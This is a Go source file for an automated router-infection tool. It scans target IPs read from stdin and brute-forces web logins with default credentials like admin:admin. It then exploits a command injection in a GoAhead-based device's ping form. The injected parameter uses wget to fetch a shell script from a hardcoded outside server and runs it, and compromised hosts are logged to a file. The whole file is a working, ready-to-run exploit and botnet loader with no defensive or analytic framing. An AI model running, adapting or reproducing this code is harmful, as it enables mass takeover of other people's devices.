/*

	Coded by Benshii Varga

	1k mips and mipsel

*/

package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
    "math/rand"
	"encoding/base64"
	//"strconv"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var loginsString = []string{"admin:admin", "user:user", "admin:1234", "admin:12345", "admin:123456"}

var serverIp string = "185.184.54.151"
var serverBin string = "76d32be0.sh" // Server bash file. Can be used with directories

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func verifySploit(target string, enLogin string) {
	conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
	   if err != nil {
		return
	}

	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	conn.Write([]byte("GET /adm/systools.asp HTTP/1.1\r\nHost: " + target + "\r\nCache-Control: max-age=0\r\nAuthorization: Basic " + enLogin + "\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/adm/systools.asp\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return
	}

	return
}

func sendExploit(target string, strLength int, enLogin string) {

	conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
	   if err != nil {
		return
	}

	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	conn.Write([]byte("POST /goform/sysTools HTTP/1.1\r\nHost: " + target + "\r\nContent-Length: 114\r\nCache-Control: max-age=0\r\nAuthorization: Basic " + enLogin +"\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: http://" + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/adm/systools.asp\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\ntool=0&pingCount=4&host=1.1.1.1%3B+wget+http%3A%2F%2F" + serverIp + "%2F" + serverBin + "%3B+chmod+777+c.sh%3B+sh+c.sh&sumbit=OK\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
		return
	}

	verifySploit(target, enLogin)

	f, err := os.OpenFile("logins.txt", os.O_APPEND|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println(err)
        return
    }
	/*deLogin, err := base64.StdEncoding.DecodeString(enLogin)
	if err != nil {
		fmt.Println(err)
		return
	}*/

    _, err = fmt.Fprintln(f, target)
    if err != nil {
      fmt.Println(err)
    }

	return
}

func sendLogin(target string) int {

	var isLoggedIn int = 0
	var cntLen int

	for x := 0; x < len(loginsString); x++ {

		conn, err := net.DialTimeout("tcp", target, 60 * time.Second)
	    if err != nil {
			return -1
	    }

		//fmt.Printf("[i] Bruting with combo %s\r\n", loginsString[x])

		login := base64.StdEncoding.EncodeToString([]byte(loginsString[x]))

		cntLen = 44
		cntLen += len(login)

	    conn.SetWriteDeadline(time.Now().Add(60 * time.Second))
	    conn.Write([]byte("GET /internet/wan.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36\r\nCache-Control: max-age=0\r\nAuthorization: Basic " + login +"\r\nUpgrade-Insecure-Requests: 1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://" + target + "/home.asp\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			conn.Close()
		    return -1
		}

		if strings.Contains(string(bytebuf), "Server: GoAhead-Webs") && strings.Contains(string(bytebuf), "HTTP/1.0 200 OK") && strings.Contains(string(bytebuf), "VINGA"){
			statusLogins++
			sendExploit(target, cntLen, login)
			isLoggedIn = 1
			return 1
		}else {
			return -1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			conn.Close()
			continue
		}

		conn.Close()
		break
	}
	return 1

	/*if isLoggedIn == 1 {
		//sendExploit(target, cntLen, login)
		statusLogins++
		return 1
	} else {
		return -1
	}*/
}

func checkDevice(target string, timeout time.Duration) int {

	var isGpon int = 0

	conn, err := net.DialTimeout("tcp", target, timeout * time.Second)
    if err != nil {
		return -1
    }
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
	conn.Write([]byte("GET /home.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36\r\nAccept: */*\r\nConnection: close\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		conn.Close()
	    return -1
	}

	if strings.Contains(string(bytebuf), "HTTP/1.0 200 OK") {
		statusFound++
		isGpon = 1
	}
	zeroByte(bytebuf)

	if isGpon == 0 {
		conn.Close()
		return -1
	}

	conn.Close()
	return 1
}

func processTarget(target string, rtarget string) {

	defer syncWait.Done()

	if checkDevice(target, 10) == 1 {
		sendLogin(target)
		//sendExploit(target, cntLen, login)
		return
	} else {
		return
	}
}

func main() {

	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0
    go func() {
		for {
			fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d\r\n", i, statusAttempted, statusFound, statusLogins)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            go processTarget(scan.Text() + ":" + os.Args[1], scan.Text())
			statusAttempted++
            syncWait.Add(1)
        }
    }
}
